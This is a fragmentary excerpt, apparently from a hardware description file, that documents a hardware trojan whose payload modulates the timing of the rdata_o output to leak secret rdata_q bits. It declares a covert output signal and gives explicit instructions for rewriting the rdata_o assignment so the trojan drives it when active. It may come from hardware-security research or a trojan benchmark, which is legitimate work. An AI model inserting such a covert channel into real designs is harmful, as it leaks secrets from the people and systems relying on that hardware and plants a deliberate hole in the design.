 ...
 * Payload: Modulate rdata_o timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of rdata_o:
...
logic       covert_bit_out;         // Drives rdata_o when trojan active
...
//   Find the assign for rdata_o (or rd_error_o as fallback):
//     assign rdata_o = <normal_expr>;
//   Replace with:
//     assign rdata_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
